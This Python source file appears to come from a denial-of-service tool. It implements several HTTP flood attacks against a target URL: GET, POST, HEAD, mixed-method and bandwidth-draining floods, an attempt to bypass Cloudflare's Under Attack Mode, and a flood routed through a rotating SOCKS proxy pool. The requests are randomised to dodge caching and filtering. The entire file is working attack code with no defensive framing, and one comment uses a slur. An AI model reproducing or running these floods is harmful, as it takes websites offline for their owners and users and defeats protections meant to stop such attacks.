# import modules
import socket, socks, requests, time, json
from random import randint, choice, uniform, shuffle

# import depencies
from src.utils import *
from src.core import *

# disable "InsecureRequestWarning"'s
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def http_get(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    HTTP GET flood
    '''

    if target_url == None: # target_url is a required arg
        return False

    time.sleep(3) # wait for other threads to spawn

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    # first thread kills the entire chain
    Core.attackrunning = False

def http_post(worker_id, session, target_url, attack_duration, useragent=None, referer=None, post_data=None):
    '''
    HTTP POST flood
    '''

    if target_url == None:
        return False

    time.sleep(3)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            headers = buildheaders(target_url, useragent, referer)

            payload_choice = randint(0,2)
            data = randstr(randint(10,20))
            if payload_choice == 1: # json payload
                json_data = {}
                for _ in range(10):
                    if randint(0,1) == 1: json_data.update({randstr(randint(5, 20)): randstr(randint(40, 60))})
                    else: json_data.update({randstr(randint(5, 20)): {choice(keywords): choice(keywords)}})

                data = json.dumps(json_data)               
                headers.update({'Content-Type': 'application/json', 'Content-Length': str(len(data))})
            elif payload_choice == 2: # url encoded payload 
                url_encoded_data = f'{choice(keywords)}={choice(keywords)}'

                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                data = url_encoded_data

            session.post(f'{target_url}{buildblock(target_url)}', headers=headers, data=data, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    Core.attackrunning = False

def http_fast(worker_id, session, target_url, attack_duration, useragent=None):
    '''
    basic GET / flood
    '''

    if target_url == None:
        return False

    time.sleep(3)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.get(f'{target_url}/', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    Core.attackrunning = False

def http_head(worker_id, session, target_url, attack_duration, useragent=None):
    '''
    Basic HEAD flood
    '''

    if target_url == None:
        return False

    time.sleep(3)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    Core.attackrunning = False

def http_ghp(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    GET/HEAD/POST flood
    '''

    if target_url == None:
        return False

    time.sleep(3)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            method_choice = randint(0,2)
            if method_choice == 0: session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)
            elif method_choice == 1: session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
            elif method_choice == 2: # url encoded data flood only
                url_encoded_data = f'{choice(keywords)}={choice(keywords)}'

                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                session.post(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=url_encoded_data, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    Core.attackrunning = False

def http_leech(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    Exotic bandwidth draining flood
    '''

    if target_url == None:
        return False

    time.sleep(3)

    stoptime = time.time() + attack_duration
    headers = buildheaders(target_url, useragent, referer)
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.get(target_url, headers=headers, verify=False, timeout=2, allow_redirects=False, stream=False)
            time.sleep(uniform(80, 160))

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    Core.attackrunning = False

def http_mix(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    Flood which randomly chooses HTTP methods
    '''

    if target_url == None:
        return False

    time.sleep(3)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            methods = ['GET', 'POST', 'HEAD', 'PATCH', 'DELETE', 'PUT', 'TRACE', 'CONNECT', 'OPTIONS', randstr(randint(2,6)).upper()]
            shuffle(methods)
            method = choice(methods)
            if method == 'POST': 
                data = f'{choice(keywords)}={choice(keywords)}'
                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                session.request('POST', f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=data, verify=False, timeout=2, allow_redirects=False, stream=False)
            else: session.request(method, f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=2, allow_redirects=False, stream=False)
            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    Core.attackrunning = False

def http_cfbp(worker_id, scraper, target_url, attack_duration, useragent=None, referer=None):
    '''
    Attack which tries to bypass Cloudflare's UAM (Under Attack Mode)
    '''

    if target_url == None:
        return False

    time.sleep(3)

    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' if useragent == None else useragent,
        'Referer': 'https://google.com' if referer == None else referer,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            scraper.get(url=target_url, headers=headers, timeout=2, allow_redirects=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    Core.attackrunning = False

def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer):
    '''
    Proxified HTTP flood
    '''

    if target_url == None:
        return False

    time.sleep(3)

    host = urlparse(target_url).netloc
    port = 443 if target_url.startswith('https://') else 80 if target_url.startswith('http://') else host.split(':')[1] if len(host.split(':')) == 2 else 80

    stoptime = time.time() + attack_duration
    s = socks.socksocket()
    while time.time() < stoptime and Core.attackrunning:
        try:
            errcount = 0
            proxip, proxport = choice(Core.proxy_pool).split(':')

            try: s.set_proxy(proto, str(proxip), int(proxport))
            except: Core.proxy_pool.delete(f'{proxip}:{proxport}'); continue

            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

            try: s.connect( (host, int(port) ))
            except: continue

            # build packet
            headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
            packet = f'GET /{buildblock("/")} HTTP/1.1\r\n{headers}\r\n'

            while Core.attackrunning: # run while we should attack
                if errcount >= 20: # 20 failed requests, gay
                    break # switch to new proxy
                try: 
                    s.send( packet.encode() )
                    Core.infodict[worker_id]['req_sent'] += 1
                except:
                    errcount+1
                    Core.infodict[worker_id]['req_fail'] += 1
                Core.infodict[worker_id]['req_total'] += 1

        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
    Core.threadcount -= 1
    
    Core.attackrunning = False

'''
def browser_emulate(worker_id, target_url, attack_duration, useragent=None):
    \'''
    Flood which uses Selenium and a specified browser driver to constantly refresh a page
    \'''

    if target_url == None:
        return False

    time.sleep(3)

    driver = getdriver(useragent)
    driver.get(target_url)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            driver.refresh()
            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    driver.close()
'''